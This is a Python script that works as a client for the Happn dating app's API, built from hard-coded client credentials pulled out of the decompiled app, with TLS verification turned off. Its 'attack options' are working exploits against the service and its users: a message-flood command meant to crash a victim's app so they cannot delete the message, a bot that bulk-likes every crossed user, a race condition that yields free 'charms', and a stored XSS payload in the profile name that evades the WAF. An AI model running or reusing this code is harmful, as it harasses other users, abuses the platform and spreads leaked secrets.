# -*- coding: utf-8 -*-

import requests
#bug in requests give ssl issues
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import json
import os, sys
import os.path
import urllib
import pprint
import uuid
from pprint import pprint
from urlparse import urlparse, parse_qs

def login():
	### function lovingly borrowed from: https://github.com/tachang/makeithappn ###
	# OAuth endpoints given in the Facebook API documentation
	random_uuid = str(uuid.uuid4())
	authorization_base_url = 'https://www.facebook.com/dialog/oauth'
	token_url = 'https://graph.facebook.com/oauth/access_token'
	redirect_uri = 'https://%s.happn.com/' % random_uuid

	url = 'https://www.facebook.com/dialog/oauth?'
	params = {
	  'client_id' : '247294518656661',
	  'redirect_uri' : redirect_uri,
	  'scope' : 'user_birthday,email,user_likes,user_about_me,user_photos,user_work_history,user_friends',
	  'response_type' : 'token'
	}

	print "Please copy this into your browser:\n %s?%s" % ( authorization_base_url, urllib.urlencode(params) )

	# Get the authorization verifier code from the callback url
	redirect_response = raw_input('Paste the full redirect URL here:')

	# Parse the redirect response for the access_token
	o = urlparse(redirect_response)

	access_token = parse_qs(o.fragment)['access_token'][0]

	# client_id and client_secret can be obtained from a decompiled
	# happn\smali\com\ftw_and_co\happn\network\services\FacebookService.smali
	data = {
	  'client_id' :  'FUE-idSEP-f7AqCyuMcPr2K-1iCIU_YlvK-M-im3c',
	  'client_secret' :  'brGoHSwZsPjJ-lBk0HqEXVtb3UFu-y5l_JcOjD-Ekv',
	  'grant_type' : 'assertion',
	  'assertion_type' : 'facebook_access_token',
	  'assertion' : access_token,
	  'scope' : 'mobile_app'
	}

	url = 'https://connect.happn.fr/connect/oauth/token'

	r = requests.post(url, headers=preAuthHeaders, data=data, verify=False)
	user_info = r.json()

	myID = user_info['user_id']
	OAuth = user_info['access_token']

	file = open("key", "w")
	file.write(OAuth)
	file.close()


def refresh():
	print "refreshing token"
#		data = {
#	  'client_id' :  'FUE-idSEP-f7AqCyuMcPr2K-1iCIU_YlvK-M-im3c',
#	  'client_secret' :  'brGoHSwZsPjJ-lBk0HqEXVtb3UFu-y5l_JcOjD-Ekv',
#	  'grant_type=refresh_token',
#	  'refresh_token' : refresh_token
#	}



def getMyID():
	response = session.get("https://api.happn.fr/api/users/me?fields=id", headers=headers, verify=False)
	if response.status_code ==200:
			c = response.content
			parsed_json = json.loads(c)

			myID = parsed_json['data']['id']
			if myID != "":
				return myID
			else:
				return 0
	else:
		return 0

def whoami():

	response = session.get("https://api.happn.fr/api/users/me?fields=display_name,id,name,workplace,gender,fb_id,about", headers=headers)
	if response.status_code ==200:
			c = response.content
			parsed_json = json.loads(c)

			display_name = parsed_json['data']['display_name'].strip()
			myID = parsed_json['data']['id']
			name = parsed_json['data']['name'].strip()
			workplace = parsed_json['data']['workplace'].strip()
			gender = parsed_json['data']['gender']
			fb_id = parsed_json['data']['fb_id']
			about = parsed_json['data']['about']

			print display_name
			print workplace
			print about

			return 1
	else:
		return 0

def findMe(myDeviceID=None):
	lat = None
	long = None
	if myDeviceID != None:
		response = session.put("https://api.happn.fr/api/users/me/devices/"+myDeviceID, headers=headers)

		if response.status_code ==200:
			c = response.content
			parsed_json = json.loads(c)

			lat = str(parsed_json['data']['position']['latitude'])
			long = str(parsed_json['data']['position']['longitude'])
	else:
		response = session.get("https://api.happn.fr/api/users/me/position", headers=headers)

		if response.status_code ==200:
			c = response.content
			parsed_json = json.loads(c)
			lat = str(parsed_json['data']['latitude'])
			long = str(parsed_json['data']['longitude'])

	if lat != None and long != None:
		map = "https://maps.google.com/maps?ll="+lat+","+long+"\&=21\&t=h\&hl=en-GB\&gl=US\&mapclient=apiv3"
		print map
		os.system("open "+map)
	else:
		print "DAD NOT FOUND"
		os.system("open https://www.youtube.com/watch?v=niqNJuihLkg")

def likeuser(id):
	#give it a 3 attempts
	for x in range(0, 3):
	   response = session.post("https://api.happn.fr/api/users/me/accepted/"+id, headers=headers)
	   if response.status_code == 200:
	   		return 1
	return 0

def getIDs(dir=-1, sort=0):#default behaviour is to go backwards in time 
								#this adds the benefit of being able to detect and jump out early if it looks like we are up to date likeing everyone.
	userIDs = []

	paramsGet = {"":"","limit":"1000000","fields":"id"}
	response = session.get("https://api.happn.fr/api/users/me/crossings", params=paramsGet, headers=headers)
	c = response.content
	crossing_data = json.loads(c)

	for item in crossing_data['data']:
		cross =  str(item['id'])
		user =  cross.split("_")[1]
		userIDs.append(user)

	if dir == 1:
		userIDs = reversed(userIDs)
	if sort == 1:
		userIDs.sort(key=int)

		return userIDs 

	return userIDs

def listMatches(menu=0):
	menuIDs = []
	response = session.get("https://api.happn.fr/api/users/me/crushes?limit=100&fields=id,first_name,school,job,workplace,age,picture.fields(url,id,is_default).width(400).mode(0).height(400)", headers=headers)
	m = response.content
	match_data = json.loads(m)
	c = 0
	for item in match_data['data']:
		id = str(item['id'])
		menuIDs.append(id)
		name = str(item['first_name'])
		fb_id = str(item['fb_id'])
		age =  str(item['age'])
		
		
		print " %02d " % c +name
		if menu == 0:
			print " https://www.facebook.com/"+fb_id
			print " "+age
			if item['school'] and item['school'] != "None":
				school =  str(item['school'])
				print " "+school
			if item['job'] and item['job'] != "None":
				job =  str(item['job'])
				print " "+job
			if item['workplace'] and item['workplace'] != "None":
				workplace =  str(item['workplace'])
				print " "+workplace
			print "----------------------------------------------" 
		c+=1
	if menu == 1:
		rec = menuIDs[int(raw_input(" Enter a match: "))]
		print ""
		return rec
	return 1


def changeName(name="name"):
	if name == "name":
		name = raw_input(" Enter a name: ")

	paramsPost = {"":"","first_name":""+name+""}
	response = session.put("https://api.happn.fr/api/users/me", data=paramsPost, headers=headers)

	if response.status_code == 200:
		return 1
	else:
		return 0

def changeAbout(about="about"):
	if about == "about":
		about = raw_input(" Enter an about: ")

	paramsPost = {"":"","about":""+about+""}
	response = session.put("https://api.happn.fr/api/users/me", data=paramsPost, headers=headers)

	if response.status_code == 200:
		return 1
	else:
		return 0

def makeMsg():
	print("Enter a message:\n"
		      "To send Press Ctrl+d on Linux/Mac on Crtl+z on Windows on a new line")
	lines = []
	try:
	    while True:
	        lines.append(raw_input())
	except EOFError:
	    pass
	msg = "\n".join(lines)
	return msg

def inbox(id=11843):
	id = str(id)
	response = session.get("https://api.happn.fr/api/conversations/"+id+"_"+myID+"/messages?limit=15&fields=message,sender.fields(first_name,is_moderator,id,picture.fields(url,id,is_default).width(70).mode(0).height(70),first_name,clickable_message_link),creation_date,id", headers=headers)
	c = response.content
	chat_data = json.loads(c)
	for item in reversed(chat_data['data']):
		print "\033[1m %-*s \033[0m [%s]\n %s" % (15,item['sender']['first_name'].strip(),item['creation_date'].replace('T', ' ')[:-9],item['message'])

def sendMsg(msg, rec=11843):
	id = str(rec)
	paramsPost = {"id":"","message":""+msg+""}
	response = session.post("https://api.happn.fr/api/conversations/"+id+"_"+myID+"/messages", data=paramsPost, headers=headers)
	if response.status_code == 200:
		return 1
	else:
		return 0

def uploadImg(): 
	image = raw_input(' Enter an image-name to upload: ')
	response = session.post('https://api.happn.fr/api/users/19119024323/images', headers=headers, files={image: open(image, 'rb')})
	c = response.content
	print c

def showImages():
	response = session.get("https://api.happn.fr/api/users/19119024323/images", headers=headers)
	c = response.content
	img_data = json.loads(c)
	for item in img_data['data']:
		if item["url"] != None:
			print item["url"]
			os.system("open "+item["url"])


# __exploits__ 
# functions below here are issues with Happn. not my problem.

def warandpeace():
	response = session.get("http://www.gutenberg.org/files/2600/2600-0.txt")
	wap = response.content
	return wap

def spoofLoc(lat, long):
	print " Spoofing "+lat+":"+long
	return 1

def bruteforceCrossings(dir=-1):#default behaviour is to go backwards in time 
								#this adds the benefit of being able to detect and jump out early if it looks like we are up to date likeing everyone.
	likes = 0
	userIDs = []

	print "finding users:"
	userIDs = getIDs(-1,0)
	print str(len(userIDs)) + " users found"

	#hashtag shitty variable names incomming
	concurrentAlreadyLikeds = 0
	breakEarly = True

	for id in userIDs:
		#print "checking " + id + " ~ total likes this session: "+str(likes)+ "concurrentAlreadyLikeds= "+str(concurrentAlreadyLikeds)
		response = session.get("https://api.happn.fr/api/users/"+id+"?fields=my_relation", headers=headers)
		u = response.content
		user_data = json.loads(u)
		if user_data['data']['my_relation'] == 0:

			if likeuser(id):
		
				#the order below is important
				likes += 1
				concurrentAlreadyLikeds = 0

				print "✔️ " +id + " NewLikes: "+str(likes)
			else:
				print "❌ " +id + "Notice: failed to like user"
				raw_input()
		
		else:
			concurrentAlreadyLikeds +=1

			print "❌ " +id + " NewLikes: "+str(likes)
		#early break <- MIGHT WANT TO MOVE THIS
		if dir == -1 and concurrentAlreadyLikeds >= 50 and breakEarly == True:
				if raw_input("It looks like you have caught up liking everyone. Do you want to stop? (Y/n)").lower() != "n":
					sys.exit(0)
				else:
					breakEarly = False
		
	return 1

def charmRacecondition(ids=[]):

	print("Paste a list of Happn IDs:\n"
		      "To Charm them Press Ctrl+d on Linux/Mac on Crtl+z on Windows on a new line")
	ids = []
	try:
	    while True:
	        ids.append(raw_input())
	except EOFError:
	    pass

	t = 0
	for id in ids:
		rawBody = id
		response = session.post("https://api.happn.fr/api/users/me/pokes/"+id, data=rawBody, headers=headers)
		if response.status_code == 200:
			t +=1
		else:
			return t
	return t

#__main__

#Load config, keys, build request hander etc.
OAuth = ""
if os.path.isfile("key"):
	file = open("key")
	OAuth = file.read()
	if OAuth == "":
		if sys.argv[1] != "login":
			print " No key found in keyfile. you must 'login' first" 
			sys.exit(0)
else:
	if len(sys.argv) > 1:
		if sys.argv[1] != "login":
			print " No keyfile found. you must 'login' first"
			sys.exit(0)

api_base = "https://api.happn.fr/api"
session = requests.Session()
preAuthHeaders = {'User-Agent': None}
timeout = 10
verify = True
proxy = {'https': 'http://127.0.0.1:8080'} #default Burp port. to proxy to a request add ',proxies=proxy,'
headers = {"Authorization":"OAuth=\""+OAuth+"\"","Connection":"close","Accept-Language":"en-GB;q=1,en;q=0.75", 'User-Agent': None}
#headers = {"Authorization":"OAuth=\""+OAuth+"\"","X-Happn-DID": XHappnDID,"X-Happn-CID": XHappnCID,"Signature": Signature,"Connection":"close","Accept-Language":"en-GB;q=1,en;q=0.75"}
#XHappnDID="" <-not needed
#XHappnCID="" <-not needed
#Signature="" <-not needed

myID = getMyID()

if len(sys.argv) > 1:
#STANDARD API
	if sys.argv[1] == "list":
		listMatches()
	elif sys.argv[1] == "login":
		login()
	elif sys.argv[1] == "name":
		changeName()
	elif sys.argv[1] == "about":
		changeAbout()
	elif sys.argv[1] == "chat":
		r = listMatches(1)
		inbox(r)
		sendMsg(makeMsg(), r)
	elif sys.argv[1] == "inbox":
		inbox(listMatches(1))
	elif sys.argv[1] == "getids":
		print '\n'.join(getIDs())
	elif sys.argv[1] == "findme":
		findMe()
	elif sys.argv[1] == "whoami":
		whoami()
	elif sys.argv[1] == "key":
		print OAuth
	elif sys.argv[1] == "newimage":
		print uploadImg()
	elif sys.argv[1] == "showimages":
		print showImages()
#HACKS
	elif sys.argv[1] == "charmrace":
		charmRacecondition()
	elif sys.argv[1] == "warandpeace":
		print "Downloading War & Peace... http://www.gutenberg.org/files/2600/2600-0.txt"
		wap = warandpeace()
		r = listMatches(1)
		if sendMsg(wap, r):
			print "War & Peace exploit sent!"
		else:
			print "Failed to send War & Peace exploit"
	elif sys.argv[1] == "brute-":
		bruteforceCrossings(dir=-1)
	elif sys.argv[1] == "brute+":
		bruteforceCrossings(dir=1)
	elif sys.argv[1] == "spoof":
		lat = raw_input(" Enter a lat: ")
		long = raw_input(" Enter a long: ")
		print spoofLoc(lat, long)
#DEMOS
	elif sys.argv[1] == "xssdemo":
		changeName('<IMG SRC=# onmouseover="alert(\'xss\')">') #A WAF blocks <script>, but nothing else.
		os.system("open https://happn.com")
	elif sys.argv[1] == "demoinbox":
		inbox()
	elif sys.argv[1] == "demochat":
		inbox()
		sendMsg(makeMsg())
		
else:
	print """
 __  __                                       
/\ \/\ \                                      
\ \ \_\ \     __     _____   _____     ___    
 \ \  _  \  /'__`\  /\ '__`\/\ '__`\ /' _ `\  
  \ \ \ \ \/\ \L\.\_\ \ \L\ \ \ \L\ \/\ \/\ \ 
   \ \_\ \_\ \__/.\_\\\\ \ ,__/\ \ ,__/\ \_\ \_\\
    \/_/\/_/\/__/\/_/ \ \ \/  \ \ \/  \/_/\/_/.py
                       \ \_\   \ \_\          
                        \/_/    \/_/                     
	\033[1mNORMAL OPTIONS: \033[0m
	login -> get a fresh API key
	name -> change your username
	about -> change your about info
	list -> show match details
	inbox -> show your conversations
	chat -> start a conversation
	findme -> show the location of your iPhone on a map
	whoami -> show your Happn info
	key -> show your current API key
	newimage -> upload an image to your profile
	showimages -> show all your uploaded images

	\033[1mATTACK OPTIONS: \033[0m
	warandpeaceout -> send the whole of war and peace as a 
		message to a victim. viewing it will crash their app so
		they will not be able to delete it.
	brute- -> bruteforce all historic crossings (new to old)
	brute+ -> bruteforce all hostoric crossings (old to new)
	charmrace -> take pasted list of ids and try to charm them
		all via a charm decrement race condition.
	spoof -> spoof a location (unfinished)
	xssdemo -> XSS PoC on happn.com

	\033[1mDEMO OPTIONS: \033[0m
	demochat -> start a conversation with the Happn bot
	demoinbox -> show your conversation with the Happn bot
	"""
